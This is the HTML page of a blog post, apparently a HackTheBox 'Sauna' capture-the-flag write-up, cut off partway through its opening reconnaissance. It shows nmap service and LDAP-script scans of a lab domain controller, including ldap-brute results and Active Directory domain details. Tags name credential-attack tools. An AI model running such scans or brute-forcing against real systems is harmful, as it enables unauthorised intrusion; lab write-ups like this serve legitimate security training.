@@ -1,0 +1,1301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>HackTheBox Sauna | DC0deZer0</title>
+<meta name="generator" content="Jekyll v4.2.0">
+<meta property="og:title" content="HackTheBox Sauna">
+<meta name="author" content="Jeevan Chandra">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="Let’s get started">
+<meta property="og:description" content="Let’s get started">
+<link rel="canonical" href="https://jeevanachandra.github.io//hackthebox/retired/2020/06/19/Sauna.html">
+<meta property="og:url" content="https://jeevanachandra.github.io//hackthebox/retired/2020/06/19/Sauna.html">
+<meta property="og:site_name" content="DC0deZer0">
+<meta property="og:image" content="https://jeevanachandra.github.io//assets/img/sample/sauna.png">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2020-06-19T22:04:00+05:30">
+<meta name="twitter:card" content="summary_large_image">
+<meta property="twitter:image" content="https://jeevanachandra.github.io//assets/img/sample/sauna.png">
+<meta property="twitter:title" content="HackTheBox Sauna">
+<script type="application/ld+json">
+{"description":"Let’s get started","dateModified":"2020-06-19T22:04:00+05:30","datePublished":"2020-06-19T22:04:00+05:30","headline":"HackTheBox Sauna","mainEntityOfPage":{"@type":"WebPage","@id":"https://jeevanachandra.github.io//hackthebox/retired/2020/06/19/Sauna.html"},"@type":"BlogPosting","author":{"@type":"Person","name":"Jeevan Chandra"},"url":"https://jeevanachandra.github.io//hackthebox/retired/2020/06/19/Sauna.html","image":"https://jeevanachandra.github.io//assets/img/sample/sauna.png","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="shortcut icon" href="">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="https://jeevanachandra.github.io//feed.xml" title="DC0deZer0">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/default.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
+<!-- and it's easy to individually load additional languages -->
+<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/languages/go.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+// Init highlight js
+document.addEventListener('DOMContentLoaded', function(event) {
+  var els = document.querySelectorAll('pre code')
+
+  function addLangData(block) {
+    var outer = block.parentElement.parentElement.parentElement;
+    var lang = block.getAttribute('data-lang');
+    for (var i = 0; i < outer.classList.length; i++) {
+      var cls = outer.classList[i];
+      if (cls.startsWith('language-')) {
+        lang = cls;
+        break;
+      }
+    }
+    if (!lang) {
+      cls = block.getAttribute('class');
+      lang = cls ? cls.replace('hljs ', '') : '';
+    }
+    if (lang.startsWith('language-')) {
+      lang = lang.substr(9);
+    }
+    block.setAttribute('class', 'hljs ' + lang);
+    block.parentNode.setAttribute('data-lang', lang);
+  }
+
+  function addBadge(block) {
+    var enabled = ('true' || 'true').toLowerCase();
+    if (enabled == 'true') {
+      var pre = block.parentElement;
+      pre.classList.add('badge');
+    }
+  }
+
+  function handle(block) {
+    addLangData(block);
+    addBadge(block)
+    hljs.highlightBlock(block);
+  }
+
+  for (var i = 0; i < els.length; i++) {
+    var el = els[i];
+    handle(el);
+  }
+});
+</script>
+
+<style>
+  /* code language badge */
+  pre.badge::before {
+    content: attr(data-lang);
+    color: #fff;
+    background-color: #ff4e00;
+    padding: 0 .5em;
+    border-radius: 0 2px;
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 32px;
+    display: inline-block;
+    position: absolute;
+    right: 0;
+  }
+
+  /* fix wrong badge display for firefox browser */
+  code > table pre::before {
+    display: none;
+  }
+</style>
+<script>MathJax={"tex":{"inlineMath":[["$","$"],["\\(","\\)"]],"displayMath":[["$$","$$"],["\\[","\\]"]]},"svg":{"fontCache":"global"}}</script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</head>
+<body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<header class="site-header " role="banner">
+
+  <div class="wrapper">
+    <div class="site-header-inner">
+<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
+  <img class="site-favicon" title="DC0deZer0" src="" onerror="this.style.display='none'">
+  DC0deZer0
+</a>
+</span><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger">
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewbox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+              </svg>
+            </span>
+          </label>
+
+          <div class="trigger">
+<a class="page-link" href="/About.html">ABOUT</a><a class="page-link" href="/VulnMachines.html">VULNERABLE MACHINES</a><a class="page-link" href="/archives.html">ARCHIVES</a><a class="page-link" href="/categories.html">CATEGORIES</a><a class="page-link" href="/">HOME</a><a class="page-link" href="/tags.html">TAGS</a>
+
+
+
+
+<span class="page-link">
+
+<div id="google_translate_element" style="display: none;">
+</div>
+
+<span class="ct-language">
+  <ul class="list-unstyled ct-language-dropdown">
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="en">
+          
+          <img src="https://www.countryflags.io/us/flat/64.png" title="English">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="fr">
+          
+          <img src="https://www.countryflags.io/fr/flat/64.png" title="Franch">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="zh-CN">
+          
+          <img src="https://www.countryflags.io/cn/flat/64.png" title="Chinese(Simple)">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ja">
+          
+          <img src="https://www.countryflags.io/jp/flat/64.png" title="Japan">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ko">
+          
+          <img src="https://www.countryflags.io/kr/flat/64.png" title="Korean">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ru">
+          
+          <img src="https://www.countryflags.io/ru/flat/64.png" title="Russia">
+          
+        </a>
+      </li>
+    
+  </ul>
+</span>
+
+<script type="text/javascript">
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({
+    pageLanguage: '',
+    autoDisplay: false,
+    layout: google.translate.TranslateElement.InlineLayout.VERTICAL
+  }, 'google_translate_element');
+
+  function restoreLang() {
+    var iframe = document.getElementsByClassName('goog-te-banner-frame')[0];
+    if (!iframe) return;
+
+    var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
+    var restore_el = innerDoc.getElementsByTagName("button");
+
+    for (var i = 0; i < restore_el.length; i++) {
+      if (restore_el[i].id.indexOf("restore") >= 0) {
+        restore_el[i].click();
+        var close_el = innerDoc.getElementsByClassName("goog-close-link");
+        close_el[0].click();
+        return;
+      }
+    }
+  }
+
+  function triggerHtmlEvent(element, eventName) {
+    var event;
+    if (document.createEvent) {
+      event = document.createEvent('HTMLEvents');
+      event.initEvent(eventName, true, true);
+      element.dispatchEvent(event);
+    } else {
+      event = document.createEventObject();
+      event.eventType = eventName;
+      element.fireEvent('on' + event.eventType, event);
+    }
+  }
+
+  var googleCombo = document.querySelector("select.goog-te-combo");
+  var langSelect = document.querySelector('.ct-language');
+  langSelect.addEventListener('click', function(event) {
+    if (!event.target) {
+      return;
+    }
+
+    var selected = document.querySelector('.ct-language .ct-language-selected');
+    if (selected) {
+      selected.classList.remove('ct-language-selected');
+    }
+
+    var target = event.target;
+    while (target && target !== langSelect ) {
+      if (target.matches('.lang-select')) {
+        break;
+      }
+      target = target.parentElement;
+    }
+
+    if (target && target.matches('.lang-select')) {
+      var lang = target.getAttribute('data-lang');
+      if (googleCombo.value == lang) {
+        restoreLang();
+      } else {
+        target.parentElement.classList.add('ct-language-selected');
+        googleCombo.value = lang;
+        triggerHtmlEvent(googleCombo, 'change');
+      }
+    }
+
+    event.preventDefault();
+  });
+}
+</script>
+
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+</span>
+</div>
+        </nav>
+</div>
+  </div>
+</header>
+
+<script>
+  (function() {
+    var lastScrollY = getScrollPos().y;
+    var documentElement = document.documentElement;
+
+    function storeScrollData() {
+      var y = getScrollPos().y;var scrollStatus = "";
+
+      if (y <= 0) {
+        scrollStatus = "top";
+      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
+        scrollStatus = "bottom";
+      } else {
+        var isScrollDown = (y - lastScrollY > 0) ? true : false;
+        scrollStatus = isScrollDown ? "down" : "up";
+      }
+
+      lastScrollY = y;
+      documentElement.setAttribute("data-scroll-status", scrollStatus);
+    }
+
+    window.addEventListener('scroll', function(e) {
+      storeScrollData();
+    });
+
+    storeScrollData();
+  })();
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+  function hashLocate(hashValue) {
+    hashValue = hashValue.replace(/^.*#h-/, '');
+    var element = document.getElementById(hashValue);
+
+    if (!element) {
+      return;
+    }
+
+    var header = document.querySelector('header.site-header');
+    var headerRect = header.getBoundingClientRect();
+    var headerTop = Math.floor(headerRect.top);
+    var headerHeight = Math.floor(headerRect.height);
+    var scrollPos = getScrollPos();
+    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);
+
+    if (offsetY == scrollPos.y) {
+      return;
+    }
+
+    if (headerTop == 0  && offsetY > scrollPos.y) {
+      offsetY += headerHeight + 2;
+    } else if (headerTop < 0  && offsetY < scrollPos.y) {
+      offsetY -= headerHeight - 2;
+    }
+
+    smoothScrollTo(offsetY);
+  }
+
+  // The first event occurred
+  window.addEventListener('load', function(event) {
+    if (window.location.hash) {
+      hashLocate(window.location.hash);
+    }
+  });
+
+  // The first event occurred
+  window.addEventListener('click', function(event) {
+    if (event.target.tagName.toLowerCase() == 'a') {
+      hashLocate(event.target.getAttribute('href'));
+    }
+  });
+</script>
+<div class="theme-toggle">
+  <input type="checkbox" id="theme-switch">
+  <label for="theme-switch">
+    <div class="toggle"></div>
+    <div class="names">
+      <p class="light">Light</p>
+      <p class="dark">Dark</p>
+    </div>
+  </label>
+</div>
+
+
+
+
+<script>
+  (function() {
+    var sw = document.getElementById('theme-switch');
+    var html = document.getElementsByTagName('html')[0];
+    var nightModeOption = ('auto' || 'auto').toLowerCase();
+    var storage = nightModeOption === 'manual'
+        ? localStorage
+        : sessionStorage;
+    var themeData = loadThemeData();
+
+    function saveThemeData(data) {
+      storage.setItem('theme', JSON.stringify(data));
+    }
+
+    function loadThemeData() {
+      var data = storage.getItem('theme');
+      try {
+        data = JSON.parse(data ? data : '');
+      } catch(e) {
+        data = { nightShift: undefined, autoToggleAt: 0 };
+        saveThemeData(data);
+      }
+      return data;
+    }
+
+    function handleThemeToggle(nightShift) {
+      themeData.nightShift = nightShift;
+      saveThemeData(themeData);
+      html.dataset.theme = nightShift ? 'dark' : 'light';
+      setTimeout(function() {
+        sw.checked = nightShift ? true : false;
+      }, 50);
+    }
+
+    function autoThemeToggle() {
+      // Next time point of theme toggle
+      var now = new Date();
+      var toggleAt = new Date();
+      var hours = now.getHours();
+      var nightShift = hours >= 19 || hours <=7;
+
+      if (nightShift) {
+        if (hours > 7) {
+          toggleAt.setDate(toggleAt.getDate() + 1);
+        }
+        toggleAt.setHours(7);
+      } else {
+        toggleAt.setHours(19);
+      }
+
+      toggleAt.setMinutes(0);
+      toggleAt.setSeconds(0);
+      toggleAt.setMilliseconds(0)
+
+      var delay = toggleAt.getTime() - now.getTime();
+
+      // auto toggle theme mode
+      setTimeout(function() {
+        handleThemeToggle(!nightShift);
+      }, delay);
+
+      return {
+        nightShift: nightShift,
+        toggleAt: toggleAt.getTime()
+      };
+    }
+
+    // Listen the theme toggle event
+    sw.addEventListener('change', function(event) {
+      handleThemeToggle(event.target.checked);
+    });
+
+    if (nightModeOption == 'auto') {
+      var data = autoThemeToggle();
+
+      // Toggle theme by local setting
+      if (data.toggleAt > themeData.autoToggleAt) {
+        themeData.autoToggleAt = data.toggleAt;
+        handleThemeToggle(data.nightShift);
+      } else {
+        handleThemeToggle(themeData.nightShift);
+      }
+    } else if (nightModeOption == 'manual') {
+      handleThemeToggle(themeData.nightShift);
+    } else {
+      var nightShift = themeData.nightShift;
+      if (nightShift === undefined) {
+        nightShift = nightModeOption === 'on';
+      }
+      handleThemeToggle(nightShift);
+    }
+  })();
+</script>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="framework">
+  <section class="main">
+
+     <div class="post">
+  <section>
+
+
+
+
+
+
+
+
+
+<header class="post-header">
+  <h1 class="post-title p-name" itemprop="name headline">HackTheBox Sauna</h1>
+  <h3 class="post-subtitle"></h3>
+
+  <p class="post-meta">
+    <time class="dt-published" datetime="2020-06-19T22:04:00+05:30" itemprop="datePublished"><i class="fa fa-calendar"></i> Jun 19, 2020
+    </time>
+    
+    <img src="/assets/img/sample/sauna.png">
+    
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 13 mins</span>
+  </p>
+<div class="post-tags">
+<a class="post-tag" href="/tags.html#windows">#windows</a><a class="post-tag" href="/tags.html#activedirectory">#activedirectory</a><a class="post-tag" href="/tags.html#evilwinrm">#evilwinrm</a><a class="post-tag" href="/tags.html#hashcat">#hashcat</a><a class="post-tag" href="/tags.html#impacket">#impacket</a><a class="post-tag" href="/tags.html#bloodhound">#bloodhound</a><a class="post-tag" href="/tags.html#mimikatz">#mimikatz</a><a class="post-tag" href="/tags.html#rpcclient">#rpcclient</a>
+</div></header>
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+    <div class="post-content e-content" itemprop="articleBody">
+
+      <h2 id="lets-get-started">Let’s get started</h2>
+
+<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap 7.80 scan initiated Sat Apr  4 05\:52\:33 2020 as: nmap -sV -A -o nmap.sauna 10.10.10.175
+Nmap scan report for 10.10.10.175
+Host is up (0.20s latency).
+Not shown: 988 filtered ports
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|\_    bind
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|\_  Potentially risky methods: TRACE
+|\_http-server-header: Microsoft-IIS/10.0
+|\_http-title: Egotistical Bank :: Home
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-04 16\:53\:10Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=4/4%Time=5E885906%P=x86_64-pc-linux-gnu%r(DNSVe
+SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
+SF:04bind\0\0\x10\0\x03");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Network Distance: 2 hops
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o\:microsoft\:windows
+
+Host script results:
+|\_clock-skew: 7h00m03s
+| smb2-security-mode: 
+|   2.02: 
+|\_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-04-04T16\:55\:52
+|\_  start\_date: N/A
+
+TRACEROUTE (using port 445/tcp)
+HOP RTT       ADDRESS
+1   197.16 ms 10.10.14.1
+2   198.35 ms 10.10.10.175
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Apr  4 05\:58\:29 2020 -- 1 IP address (1 host up) scanned in 356.97 seconds  
+</code></pre></div></div>
+
+<h2 id="using-nmap-to-see-any-users-can-be-found-in-the-domain">Using NMAP to see any users can be found in the domain.</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap 7.80 scan initiated Sat Apr  4 06\:13\:39 2020 as: nmap -n -sV -script *ldap* -p 389 -oA script.ldap 10.10.10.175
+Nmap scan report for 10.10.10.175
+Host is up (0.20s latency).
+
+PORT    STATE SERVICE VERSION
+389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
+| ldap-brute: 
+|   root: &lt;empty&gt;=&gt; Valid credentials
+|   admin: &lt;empty&gt;=&gt; Valid credentials
+|   administrator: &lt;empty&gt;=&gt; Valid credentials
+|   webadmin: &lt;empty&gt;=&gt; Valid credentials
+|   sysadmin: &lt;empty&gt;=&gt; Valid credentials
+|   netadmin: &lt;empty&gt;=&gt; Valid credentials
+|   guest: &lt;empty&gt;=&gt; Valid credentials
+|   user: &lt;empty&gt;=&gt; Valid credentials
+|   web: &lt;empty&gt;=&gt; Valid credentials
+|\_  test: &lt;empty&gt;=&gt; Valid credentials
+| ldap-rootdse: 
+| LDAP Results
+|   &lt;root&gt;|       domainFunctionality: 7
+|       forestFunctionality: 7
+|       domainControllerFunctionality: 7
+|       rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
+|       ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna\$@EGOTISTICAL-BANK.LOCAL
+|       isGlobalCatalogReady: TRUE
+|       supportedSASLMechanisms: GSSAPI
+|       supportedSASLMechanisms: GSS-SPNEGO
+|       supportedSASLMechanisms: EXTERNAL
+|       supportedSASLMechanisms: DIGEST-MD5
+|       supportedLDAPVersion: 3
+|       supportedLDAPVersion: 2
+|       supportedLDAPPolicies: MaxPoolThreads
+|       supportedLDAPPolicies: MaxPercentDirSyncRequests
+|       supportedLDAPPolicies: MaxDatagramRecv
+|       supportedLDAPPolicies: MaxReceiveBuffer
+|       supportedLDAPPolicies: InitRecvTimeout
+|       supportedLDAPPolicies: MaxConnections
+|       supportedLDAPPolicies: MaxConnIdleTime
+|       supportedLDAPPolicies: MaxPageSize
+|       supportedLDAPPolicies: MaxBatchReturnMessages
+|       supportedLDAPPolicies: MaxQueryDuration
+|       supportedLDAPPolicies: MaxDirSyncDuration
+|       supportedLDAPPolicies: MaxTempTableSize
+|       supportedLDAPPolicies: MaxResultSetSize
+|       supportedLDAPPolicies: MinResultSets
+|       supportedLDAPPolicies: MaxResultSetsPerConn
+|       supportedLDAPPolicies: MaxNotificationPerConn
+|       supportedLDAPPolicies: MaxValRange
+|       supportedLDAPPolicies: MaxValRangeTransitive
+|       supportedLDAPPolicies: ThreadMemoryLimit
+|       supportedLDAPPolicies: SystemMemoryLimitPercent
+|       supportedControl: 1.2.840.113556.1.4.319
+|       supportedControl: 1.2.840.113556.1.4.801
+|       supportedControl: 1.2.840.113556.1.4.473
+|       supportedControl: 1.2.840.113556.1.4.528
+|       supportedControl: 1.2.840.113556.1.4.417
+|       supportedControl: 1.2.840.113556.1.4.619
+|       supportedControl: 1.2.840.113556.1.4.841
+|       supportedControl: 1.2.840.113556.1.4.529
+|       supportedControl: 1.2.840.113556.1.4.805
+|       supportedControl: 1.2.840.113556.1.4.521
+|       supportedControl: 1.2.840.113556.1.4.970
+|       supportedControl: 1.2.840.113556.1.4.1338
+|       supportedControl: 1.2.840.113556.1.4.474
+|       supportedControl: 1.2.840.113556.1.4.1339
+|       supportedControl: 1.2.840.113556.1.4.1340
+|       supportedControl: 1.2.840.113556.1.4.1413
+|       supportedControl: 2.16.840.1.113730.3.4.9
+|       supportedControl: 2.16.840.1.113730.3.4.10
+|       supportedControl: 1.2.840.113556.1.4.1504
+|       supportedControl: 1.2.840.113556.1.4.1852
+|       supportedControl: 1.2.840.113556.1.4.802
+|       supportedControl: 1.2.840.113556.1.4.1907
+|       supportedControl: 1.2.840.113556.1.4.1948
+|       supportedControl: 1.2.840.113556.1.4.1974
+|       supportedControl: 1.2.840.113556.1.4.1341
+|       supportedControl: 1.2.840.113556.1.4.2026
+|       supportedControl: 1.2.840.113556.1.4.2064
+|       supportedControl: 1.2.840.113556.1.4.2065
+|       supportedControl: 1.2.840.113556.1.4.2066
+|       supportedControl: 1.2.840.113556.1.4.2090
+|       supportedControl: 1.2.840.113556.1.4.2205
+|       supportedControl: 1.2.840.113556.1.4.2204
+|       supportedControl: 1.2.840.113556.1.4.2206
+|       supportedControl: 1.2.840.113556.1.4.2211
+|       supportedControl: 1.2.840.113556.1.4.2239
+|       supportedControl: 1.2.840.113556.1.4.2255
+|       supportedControl: 1.2.840.113556.1.4.2256
+|       supportedControl: 1.2.840.113556.1.4.2309
+|       supportedControl: 1.2.840.113556.1.4.2330
+|       supportedControl: 1.2.840.113556.1.4.2354
+|       supportedCapabilities: 1.2.840.113556.1.4.800
+|       supportedCapabilities: 1.2.840.113556.1.4.1670
+|       supportedCapabilities: 1.2.840.113556.1.4.1791
+|       supportedCapabilities: 1.2.840.113556.1.4.1935
+|       supportedCapabilities: 1.2.840.113556.1.4.2080
+|       supportedCapabilities: 1.2.840.113556.1.4.2237
+|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|       serverName: CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|       schemaNamingContext: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|       namingContexts: DC=EGOTISTICAL-BANK,DC=LOCAL
+|       namingContexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|       namingContexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|       namingContexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+|       namingContexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+|       isSynchronized: TRUE
+|       highestCommittedUSN: 53385
+|       dsServiceName: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|       dnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL
+|       defaultNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
+|       currentTime: 20200404171356.0Z
+|\_      configurationNamingContext: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+| ldap-search: 
+|   Context: DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: DC=EGOTISTICAL-BANK,DC=LOCAL
+|         objectClass: top
+|         objectClass: domain
+|         objectClass: domainDNS
+|         distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
+|         instanceType: 5
+|         whenCreated: 2020/01/23 05\:44\:25 UTC
+|         whenChanged: 2020/04/03 23\:33\:53 UTC
+|         subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         uSNCreated: 4099
+|         dSASignature: \x01\x00\x00\x00\(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC
+|         uSNChanged: 53269
+|         name: EGOTISTICAL-BANK
+|         objectGUID: 504e6ec-c122-a143-93c0-cf487f83363
+|         replUpToDateVector: \x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xFDZ\x85\x92F\xDE^A\xAAVnj@#\xF6\x0C\x0B\xD0\x00\x00\x00\x00\x00\x00\xDFX\x98\x14\x03\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC	\xB0\x00\x00\x00\x00\x00\x00\xD4\x04R\x14\x03\x00\x00\x00
+|         creationTime: 132304304332325407
+|         forceLogoff: -9223372036854775808
+|         lockoutDuration: -18000000000
+|         lockOutObservationWindow: -18000000000
+|         lockoutThreshold: 0
+|         maxPwdAge: -36288000000000
+|         minPwdAge: -864000000000
+|         minPwdLength: 7
+|         modifiedCountAtLastProm: 0
+|         nextRid: 1000
+|         pwdProperties: 1
+|         pwdHistoryLength: 24
+|         objectSid: 1-5-21-2966785786-3096785034-1186376766
+|         serverState: 1
+|         uASCompat: 1
+|         modifiedCount: 1
+|         auditingPolicy: \x00\x01
+|         nTMixedDomain: 0
+|         rIDManagerReference: CN=RID Manager\$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         systemFlags: -1946157056
+|         wellKnownObjects: B\:32\:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B\:32\:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B\:32\:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B\:32\:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B\:32\:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B\:32\:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B\:32\:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B\:32\:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B\:32\:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B\:32\:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B\:32\:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         isCriticalSystemObject: TRUE
+|         gPLink: \[LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
+|         dSCorePropagationData: 1601/01/01 00\:00\:00 UTC
+|         otherWellKnownObjects: B\:32\:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         otherWellKnownObjects: B\:32\:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         ms-DS-MachineAccountQuota: 10
+|         msDS-Behavior-Version: 7
+|         msDS-PerUserTrustQuota: 1
+|         msDS-AllUsersTrustQuota: 1000
